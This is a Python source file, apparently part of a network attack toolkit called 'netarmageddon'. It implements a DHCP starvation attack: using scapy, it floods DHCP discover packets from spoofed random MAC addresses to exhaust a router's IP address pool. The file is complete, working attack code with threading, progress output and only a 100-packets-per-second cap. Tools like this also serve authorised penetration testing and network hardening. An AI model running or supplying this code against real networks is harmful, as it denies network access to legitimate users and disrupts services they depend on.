import random
import re
import threading
import time
from collections import deque
from typing import List, Optional

from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
from scapy.packet import Packet
from scapy.sendrecv import sendp
from scapy.arch import get_if_list

from netarmageddon.utils.output_manager import (
    HEAD,
    INFO,
    DEBUG,
    WARNING,
    ERROR,
    CMD,
    CLEAR,
    SUCCESS,
    BOLD,
    RESET,
    BRIGHT_CYAN,
    BRIGHT_WHITE,
    BRIGHT_YELLOW,
    THIN_DELIM,
    make_progress_bar,
)


class DHCPExhaustion:
    """Simulate multiple DHCP clients to exhaust a router's IP pool."""

    MAX_PPS: int = 100  # Class-wide safety limit
    S_PORT = 68
    D_PORT = 67

    def __init__(
        self,
        interface: str,
        num_devices: int = 50,
        request_options: Optional[List[int]] = None,
        client_src: Optional[List[str]] = None,
    ) -> None:
        self.start_time = time.time()
        self.interface = interface
        self.running = False
        self._stopped = False
        self.thread: Optional[threading.Thread] = None
        self._validate_interface()

        if num_devices < 1:
            raise ValueError("Number of devices must be at least 1")
        self.num_devices = num_devices
        self.request_options = request_options or list(range(81))
        self.client_src: List[str] = self._validate_macs(client_src) if client_src else []
        self.mac_pool: deque = deque(self.client_src)
        self.sent_macs: set = set()
        self.lock = threading.Lock()

        DEBUG(f"Initialised with {num_devices} devices")
        HEAD("⚡  DHCP Exhaustion — Configuration")
        CMD(f"  {'Interface':<20} {BRIGHT_CYAN}{self.interface}{RESET}")
        mac_src = "Predefined pool" if self.client_src else "Random generation (de:ad:xx:xx:xx:xx)"
        CMD(f"  {'MAC Source':<20} {BRIGHT_CYAN}{mac_src}{RESET}")
        CMD(f"  {'Devices':<20} {BRIGHT_CYAN}{self.num_devices}{RESET}")
        req_preview = self.request_options[:8]
        ellipsis = "..." if len(self.request_options) > 8 else ""
        CMD(f"  {'Request options':<20} {BRIGHT_CYAN}{req_preview}{ellipsis}{RESET}")
        CMD(THIN_DELIM)

    def _validate_interface(self) -> None:
        DEBUG(f"Validating interface: {self.interface}")
        if self.interface not in get_if_list():
            ERROR(f"Interface '{self.interface}' not found!")
            CMD(f"  Available: {BRIGHT_CYAN}{', '.join(get_if_list())}{RESET}")
            raise ValueError(f"Interface '{self.interface}' not found")
        INFO(f"Interface {BOLD}{BRIGHT_CYAN}{self.interface}{RESET} validated")

    def _rate_limit(self, pps: int) -> int:
        if pps > self.MAX_PPS:
            WARNING(f"Rate capped: {pps} → {self.MAX_PPS} pps (safety limit)")
            return self.MAX_PPS
        return pps

    def _validate_macs(self, mac_list: List[str]) -> List[str]:
        DEBUG(f"Validating {len(mac_list)} MAC addresses")
        validated = []
        pattern = r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$"
        for idx, mac in enumerate(mac_list):
            if not re.match(pattern, mac):
                ERROR(f"Invalid MAC #{idx + 1}: {mac}")
                raise ValueError("Invalid MAC format — use '01:23:45:67:89:ab'")
            clean_mac = mac.lower().replace("-", ":")
            validated.append(clean_mac)
            DEBUG(f"  Normalised MAC {idx + 1}: {clean_mac}")
        INFO(f"MAC validation passed ({len(validated)} address(es))")
        return validated

    def _generate_mac(self) -> str:
        if self.mac_pool:
            mac = self.mac_pool[0]
            self.mac_pool.rotate(-1)
            return mac
        while True:
            mac = "de:ad:%02x:%02x:%02x:%02x" % (
                random.randint(0, 0xFF),
                random.randint(0, 0x7F),
                random.randint(0, 0xFF),
                random.randint(0, 0xFF),
            )
            if mac not in self.sent_macs:
                self.sent_macs.add(mac)
                return mac

    def _create_dhcp_packet(self) -> Packet:
        mac = self._generate_mac()
        return (
            Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
            / IP(src="0.0.0.0", dst="255.255.255.255")
            / UDP(sport=self.S_PORT, dport=self.D_PORT)
            / BOOTP(chaddr=mac)
            / DHCP(
                options=[
                    ("message-type", "discover"),
                    ("client_id", mac),
                    ("param_req_list", self.request_options),
                    "end",
                ]
            )
        )

    def _send_loop(self) -> None:
        try:
            INFO("🚀 Starting DHCP exhaustion attack")
            sent_count = 0
            self.attack_start = time.time()
            base_pps = max(1, self.num_devices)
            allowed_pps = self._rate_limit(base_pps)
            delay = 1.0 / allowed_pps if allowed_pps > 0 else 0

            INFO(
                f"  Rate: {BOLD}{BRIGHT_YELLOW}{allowed_pps}{RESET} pps  |  "
                f"ETA: {BOLD}{BRIGHT_WHITE}{self.num_devices / allowed_pps:.1f}s{RESET}"
            )

            while self.running and sent_count < self.num_devices:
                pkt = self._create_dhcp_packet()
                sendp(pkt, iface=self.interface, verbose=False)
                sent_count += 1
                bar = make_progress_bar(sent_count, self.num_devices)
                CLEAR()
                INFO(
                    f"  Sending {bar}  "
                    f"{BRIGHT_CYAN}{sent_count}{RESET}/{BRIGHT_WHITE}{self.num_devices}{RESET}",
                    end="\r",
                )
                time.sleep(delay)

            if sent_count >= self.num_devices:
                INFO("")
                SUCCESS(f"All {self.num_devices} DHCP packets sent — pool exhaustion complete")
                self.stop()

        except Exception as e:
            ERROR(f"Critical failure: {str(e)}")
            self.stop()

    def user_abort(self) -> None:
        WARNING("User requested stop")
        self.stop()

    def start(self) -> None:
        if not self.running:
            DEBUG("Spawning attack thread")
            self.running = True
            self.thread = threading.Thread(target=self._send_loop, name="DHCPExhaustionThread")
            self.thread.start()

    def stop(self) -> None:
        if not self.running:
            return
        DEBUG("Initiating shutdown")
        self.running = False
        if self.thread and self.thread.is_alive():
            if threading.current_thread() is not self.thread:
                self.thread.join(timeout=5)
                if self.thread.is_alive():
                    WARNING("Thread shutdown delayed")
        if hasattr(self, "start_time"):
            duration = time.time() - self.start_time
            INFO(f"  Total duration: {BOLD}{BRIGHT_WHITE}{duration:.1f}s{RESET}")
            SUCCESS("DHCP attack terminated cleanly")
        self._stopped = True

    def __enter__(self) -> "DHCPExhaustion":
        self.start()
        return self

    def __exit__(self, exc_type: object, exc_val: object, exc_tb: object) -> None:
        if not self._stopped:
            self.stop()
